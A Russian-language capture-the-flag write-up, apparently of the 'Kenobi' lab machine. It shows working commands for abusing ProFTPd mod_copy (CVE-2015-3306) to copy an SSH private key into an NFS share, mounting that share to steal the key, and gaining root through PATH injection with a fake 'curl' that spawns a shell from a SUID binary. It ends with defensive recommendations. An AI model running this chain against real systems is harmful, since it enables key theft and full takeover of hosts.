## Кратко

Машина с открытыми Samba, ProFTPd и NFS. Анонимный доступ к Samba раскрывает конфигурационный файл с упоминанием SSH-ключа пользователя `kenobi`. Уязвимость `mod_copy` (CVE-2015-3306) во ProFTPd позволяет скопировать приватный ключ в директорию, доступную через NFS, откуда он извлекается для входа по SSH. Повышение привилегий — через path injection в кастомном SUID-бинарнике.

## 1. Разведка

### Сканирование портов и служб

Сканирование `nmap` показало открытые системные службы:
- **Порт 445 (Samba)** — сетевые папки
- **Порт 21 (ProFTPd 1.3.5)** — FTP-сервер
- **Порты 111/2049 (RPC/NFS)** — сетевая файловая система

### Исследование Samba

Скрипт `smb-enum-shares` обнаружил анонимный доступ к сетевой директории `anonymous`. Через `smbclient` внутри найден файл `log.txt` с конфигурационной информацией сервера, включая упоминание генерации SSH-ключей для пользователя `kenobi`.

### Поиск уязвимостей FTP

По версии FTP-сервера (ProFTPd 1.3.5) найдена критическая уязвимость **CVE-2015-3306** в модуле `mod_copy`, позволяющая неавторизованному пользователю копировать файлы внутри системы командами `SITE CPFR`/`SITE CPTO`. Эксплойты для автоматизации есть в `searchsploit`, но атака проведена вручную.

## 2. Получение доступа

Используя уязвимость `mod_copy`, копируем приватный SSH-ключ пользователя `kenobi` в директорию `/var`, которая монтируется через NFS:

```bash
nc <target_ip> 21
SITE CPFR /home/kenobi/.ssh/id_rsa
SITE CPTO /var/tmp/id_rsa
```

Монтируем сетевую папку `/var` на атакующей машине:

```bash
mkdir /mnt/kenobi_nfs
mount -t nfs <target_ip>:/var /mnt/kenobi_nfs
```

Извлекаем приватный ключ на свою машину:

```bash
cp /mnt/kenobi_nfs/tmp/id_rsa .
chmod 600 id_rsa
```

Подключаемся по SSH с использованием ключа:

```bash
ssh -i id_rsa kenobi@<target_ip>
```

Читаем флаг пользователя:

```bash
cat /home/kenobi/user.txt
```

**Флаг пользователя:** содержимое `user.txt`

## 3. Повышение привилегий

Ищем файлы с установленным SUID-битом:

```bash
find / -perm -u=s -type f 2>/dev/null
```

Среди стандартных утилит обнаружен нестандартный бинарник `/usr/bin/menu`.

### Анализ уязвимости

При запуске первый пункт меню программы выполняет сетевой запрос через `curl`. Проблема в том, что программа вызывает команду `curl` по относительному пути, а не по абсолютному (`/usr/bin/curl`), то есть полагается на переменную окружения `$PATH`.

### Эксплуатация (path injection)

Поскольку переменную `$PATH` можно контролировать в рамках своей сессии, подменяем легитимный `curl` на вредоносный файл, который выполнится с правами `root` (SUID-бит у `menu`).

Переходим в директорию с правом записи:

```bash
cd /tmp
```

Создаем поддельный `curl`, который сразу открывает shell:

```bash
echo "/bin/sh" > curl
chmod 777 curl
```

Подменяем `$PATH`, вынося `/tmp` на первое место в приоритете поиска:

```bash
export PATH=/tmp:$PATH
```

Запускаем уязвимый бинарник и выбираем первый пункт меню:

```bash
/usr/bin/menu
```

Программа ищет `curl` через `$PATH`, находит поддельный файл в `/tmp` и запускает его. Так как `menu` имеет SUID-бит владельца `root`, запущенный `/bin/sh` сразу дает сессию суперпользователя:

```bash
id
cat /root/root.txt
```

**Флаг root:** содержимое `root.txt`

## Выводы

- Анонимный доступ к Samba раскрыл внутренние конфигурационные детали, включая факт существования SSH-ключей пользователя.
- CVE-2015-3306 в ProFTPd (`mod_copy`) позволяет копировать произвольные файлы без аутентификации — критическая уязвимость для версии 1.3.5.
- Связка NFS-экспорта с доступной для записи директорией и FTP-уязвимости копирования файлов дала путь к хищению приватного ключа.
- SUID-бинарник, вызывающий системные команды по относительному пути без фиксации `$PATH`, — классический вектор path injection для привилегированной эскалации.
- Для защиты: обновить ProFTPd, ограничить NFS-экспорты по IP и правам, использовать абсолютные пути в SUID-программах, не хранить SSH-ключи с избыточными правами на чтение.

## Использованные инструменты

`nmap`, `smbclient`, `nc`, `searchsploit`, `mount` (NFS), `ssh`
